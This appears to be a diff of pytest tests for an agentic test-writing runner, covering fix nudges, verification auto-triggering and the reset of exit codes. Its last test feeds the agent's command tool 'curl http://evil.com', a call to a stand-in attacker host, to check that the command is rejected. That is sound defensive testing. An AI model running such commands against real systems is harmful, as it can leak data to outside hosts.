@@ -1199,7 +1199,7 @@ class TestPhasedRunner:
             "tools": [],
         }
 
-    def _make_auto_trigger_config(self):
+    def _make_auto_trigger_config(self, runner_command="bun test"):
         return {
             "agent": {"max_steps": 5, "max_tool_output": 8000},
             "verification": {"max_rejections": 3},
@@ -1211,7 +1211,7 @@ class TestPhasedRunner:
                 "quality_failed": "FAIL: {details}",
             },
             "llm": {"model": "test-model"},
-            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
+            "runner": {"command": runner_command, "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
             "timeouts": {"tool_execution": 10, "llm_request": 10, "test_run": 10},
             "tools": [],
         }
@@ -1296,8 +1296,6 @@ class TestPhasedRunner:
         assert "handleResub" in user_msg["content"]
 
     def test_injects_fix_nudge_after_test_file_created(self, tmp_path, monkeypatch):
-        import agentic_tdd_runner.agent as _agent_mod
-
         src = tmp_path / "src" / "client.ts"
         src.parent.mkdir(parents=True)
         src.write_text("export function handleResub(event) {\n  return event;\n}\n")
@@ -1344,7 +1342,6 @@ class TestPhasedRunner:
             }
 
         def fake_execute(name, args):
-            _agent_mod._last_run_exit_code = None
             return f"OK: created {args.get('path', '')}"
 
         args = SimpleNamespace(
@@ -1376,6 +1373,84 @@ class TestPhasedRunner:
         ]
         assert len(user_nudges) >= 1
 
+    def test_does_not_inject_fix_nudge_when_create_file_fails(self, tmp_path, monkeypatch):
+        src = tmp_path / "src" / "client.ts"
+        src.parent.mkdir(parents=True)
+        src.write_text("export function handleResub(event) {\n  return event;\n}\n")
+
+        episode = {
+            "source_file": "src/client.ts",
+            "target_symbol": "handleResub",
+            "test_file": "src/client.test.ts",
+            "source_import_path": "./client",
+            "runner": "bun:test",
+            "mocks_text": "",
+            "pre_test_source_edits": [],
+            "conditional_source_edits": [],
+            "assertion_hint": "",
+            "cookbook_text": "## Mock Cookbook\n",
+        }
+
+        chat_call_count = [0]
+        captured_messages = []
+
+        def fake_chat(messages):
+            chat_call_count[0] += 1
+            captured_messages.append([m.copy() for m in messages])
+            if chat_call_count[0] == 1:
+                return {
+                    "choices": [{"message": {
+                        "role": "assistant",
+                        "content": None,
+                        "tool_calls": [{
+                            "id": "call_1",
+                            "function": {
+                                "name": "create_file",
+                                "arguments": '{"path": "src/client.test.ts", "content": "test code"}',
+                            },
+                        }],
+                    }, "finish_reason": "tool_calls"}],
+                    "usage": {},
+                    "timings": {},
+                }
+            return {
+                "choices": [{"message": {"role": "assistant", "content": "continuing"}, "finish_reason": "stop"}],
+                "usage": {},
+                "timings": {},
+            }
+
+        def fake_execute(_name, _args):
+            return "ERROR: src/client.test.ts already exists. Use str_replace_editor to modify it."
+
+        args = SimpleNamespace(
+            issue="bug text",
+            source="src/client.ts",
+            symbol="handleResub",
+            workdir=str(tmp_path),
+            config="unused.toml",
+            log_dir=str(tmp_path),
+        )
+        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_config())
+        monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
+        monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
+        monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
+        monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
+        monkeypatch.setattr("agentic_tdd_runner.agent.chat", fake_chat)
+        monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
+        monkeypatch.setattr("agentic_tdd_runner.cookbook.build_episode_context", lambda **kw: episode)
+
+        main()
+
+        assert chat_call_count[0] >= 2
+        second_call_msgs = captured_messages[1]
+        user_nudges = [
+            m for m in second_call_msgs
+            if m["role"] == "user"
+            and "run" in m.get("content", "").lower()
+            and "fix" in m.get("content", "").lower()
+        ]
+        assert len(user_nudges) == 0
+
     def test_auto_triggers_verify_when_test_exits_zero(self, tmp_path, monkeypatch):
         import agentic_tdd_runner.agent as _agent_mod
 
@@ -1384,7 +1459,7 @@ class TestPhasedRunner:
 
         def fake_execute(name, args):
             _agent_mod._last_run_exit_code = 0
-            return "bun test v1.3.5\n\n 3 pass\n 0 fail\nRan 3 tests across 1 file.\n"
+            return "pnpm test v1.3.5\n\n 3 pass\n 0 fail\nRan 3 tests across 1 file.\n"
 
         args = SimpleNamespace(
             issue="bug text",
@@ -1394,12 +1469,12 @@ class TestPhasedRunner:
             config="unused.toml",
             log_dir=str(tmp_path),
         )
-        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_auto_trigger_config())
+        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_auto_trigger_config("pnpm test"))
         monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
         monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
         monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
         monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
-        monkeypatch.setattr("agentic_tdd_runner.agent.chat", self._make_chat_with_tool_call(step_count))
+        monkeypatch.setattr("agentic_tdd_runner.agent.chat", self._make_chat_with_tool_call(step_count, "pnpm test src/file.test.ts"))
         monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
         monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", lambda tf: (True, "All quality checks passed"))
         monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
@@ -1429,12 +1504,12 @@ class TestPhasedRunner:
             config="unused.toml",
             log_dir=str(tmp_path),
         )
-        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_auto_trigger_config())
+        monkeypatch.setattr("agentic_tdd_runner.config.load_config", lambda path: self._make_auto_trigger_config("pnpm test"))
         monkeypatch.setattr("agentic_tdd_runner.agent.parse_args", lambda: args)
         monkeypatch.setattr("agentic_tdd_runner.agent.init_log", lambda: str(tmp_path / "agent.jsonl"))
         monkeypatch.setattr("agentic_tdd_runner.agent.emit", lambda msg: None)
         monkeypatch.setattr("agentic_tdd_runner.agent.log", lambda *a, **kw: None)
-        monkeypatch.setattr("agentic_tdd_runner.agent.chat", self._make_chat_with_tool_call(step_count))
+        monkeypatch.setattr("agentic_tdd_runner.agent.chat", self._make_chat_with_tool_call(step_count, "pnpm test src/file.test.ts"))
         monkeypatch.setattr("agentic_tdd_runner.agent.find_test_file", lambda hint=None: "src/file.test.ts")
         monkeypatch.setattr("agentic_tdd_runner.agent.run_quality_checks", lambda tf: (True, "All quality checks passed"))
         monkeypatch.setattr("agentic_tdd_runner.agent.execute_tool", fake_execute)
@@ -1444,3 +1519,17 @@ class TestPhasedRunner:
 
         assert result == 1
         assert len(verify_calls) == 0
+
+
+class TestRunCommandExitCode:
+    """run_command should not leak stale success exit codes across failures."""
+
+    def test_resets_stale_exit_code_when_command_is_rejected(self):
+        import agentic_tdd_runner.agent as _agent_mod
+
+        _agent_mod._last_run_exit_code = 0
+
+        result = execute_tool("run_command", {"command": "curl http://evil.com"})
+
+        assert result.startswith("ERROR:")
+        assert _agent_mod._last_run_exit_code is None
